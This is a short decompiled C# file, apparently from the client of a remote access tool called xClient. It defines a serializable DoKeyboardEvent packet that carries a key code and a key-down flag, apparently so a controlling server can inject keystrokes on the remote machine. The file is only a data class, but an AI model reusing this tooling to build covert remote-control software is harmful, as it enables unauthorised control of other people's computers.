using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000043 RID: 67
	[Serializable]
	public class DoKeyboardEvent : IPacket
	{
		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060001C7 RID: 455 RVA: 0x00002D77 File Offset: 0x00000F77
		// (set) Token: 0x060001C8 RID: 456 RVA: 0x00002D7F File Offset: 0x00000F7F
		public byte Key { get; set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060001C9 RID: 457 RVA: 0x00002D88 File Offset: 0x00000F88
		// (set) Token: 0x060001CA RID: 458 RVA: 0x00002D90 File Offset: 0x00000F90
		public bool KeyDown { get; set; }

		// Token: 0x060001CB RID: 459 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoKeyboardEvent()
		{
		}

		// Token: 0x060001CC RID: 460 RVA: 0x00002D99 File Offset: 0x00000F99
		public DoKeyboardEvent(byte key, bool keyDown)
		{
			this.Key = key;
			this.KeyDown = keyDown;
		}

		// Token: 0x060001CD RID: 461 RVA: 0x00002DAF File Offset: 0x00000FAF
		public void Execute(Client client)
		{
			client.Send<DoKeyboardEvent>(this);
		}
	}
}
